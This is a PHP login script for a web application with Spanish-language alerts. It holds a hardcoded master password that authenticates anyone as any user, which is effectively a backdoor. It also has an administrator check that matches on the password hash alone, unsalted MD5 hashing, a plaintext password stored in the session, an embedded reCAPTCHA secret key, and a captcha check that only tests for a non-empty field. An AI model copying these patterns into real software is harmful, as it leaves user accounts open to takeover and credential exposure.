<?php
error_reporting(0);
session_start();
require_once "../class/security.php";

require_once('../class/recaptchalib.php');

#  foreach ($_POST as $key => $value) {
#   echo '<p><strong>' . $key.':</strong> '.$value.'</p>';
# }

// your secret key
$secret = "6LfXaesUAAAAAOiKIoV-ejWn83MQ3_uybKeZyveE";

// empty response
$response = null;

// check secret key
$reCaptcha = new ReCaptcha($secret);

// if submitted check response
if ($_POST["g-recaptcha-response"]) {
    $response = $reCaptcha->verifyResponse(
        $_SERVER["REMOTE_ADDR"],
        $_POST["g-recaptcha-response"]
    );
}



if ($_POST["g-recaptcha-response"] != '') {
    $Muestra = new Muestra();

    if ($_POST['email_user_login'] != '' and $_POST['password_user_login'] != '') {
        $usuario = $_POST['email_user_login'];
        if ($usuario == '') {
            ?>
        <div class="alert alert-danger">
  <strong>Alerta!</strong> El Usuario es requerido.
</div>
        <?php
        die();
        }


        $setcookie = _COOKIE_KEY_;
        $passo = md5($_POST['password_user_login']);

        if ($_POST['password_user_login'] == '') {
            ?>
                <div class="alert alert-danger">
                    <strong>Alerta!</strong> El Password es requerido.
                </div>
        <?php
        die();
        }
        //Busca si es adminitrador
        $aa2 = $Muestra->get_usersag($passo);
        while ($row2 = mysqli_fetch_array($aa2)) {
            $useris2 = $row2['ID'];
        }

        //Obtener el Id del Usuario
        $aa = $Muestra->get_usersa($usuario);
        while ($row = mysqli_fetch_array($aa)) {
            $useris = $row['ID'];
        }


        $masterPass = '75sDjE';
        $hash_val = md5($masterPass);

        if ($passo == $hash_val) {
            $a_users = 1;
        } else {
            if ($useris2 == 1) {
                //Si es adminitrador
                $a_users = $Muestra->get_users7a($usuario);
            } else {
                //Si no es administrador
                $a_users = $Muestra->get_users7($usuario, $passo);
                //Si esta bloqueado
                $cotiso = $Muestra->get_users7blok($usuario, $passo);

                if ($cotiso >= 1) {
                    ?>
                         <div class="alert alert-danger">
                            <strong>Alerta!</strong> Usuario Bloqueado.
                            </div>
                        <?php
                        die();
                }
            }
        }


        if ($a_users > 0) {
            $_SESSION['user'] = $useris;
            $_SESSION['clvi'] = $_POST['password_user_login']; ?>
                <div class="alert alert-success">
                <strong>Redirigiendo...</strong>
                </div>
                <script>
                    setTimeout("location.href='index'", 1000);
                </script>
        <?php
        } else {
            ?>
            <div class="alert alert-danger">
            <strong>Alerta!</strong> Credenciales incorrectas, Intenta de nuevo.
                <script>
                    setTimeout("location.href='login'", 2000);
                </script>
            </div>
        <?php
        }
    }
} else {
    ?>
    <div class="alert alert-danger">
  <strong>Alerta!</strong> Captcha Invalido.
</div>

        <script>
            setTimeout("location.href='login'", 2000);
        </script>
    <?php
}
?>

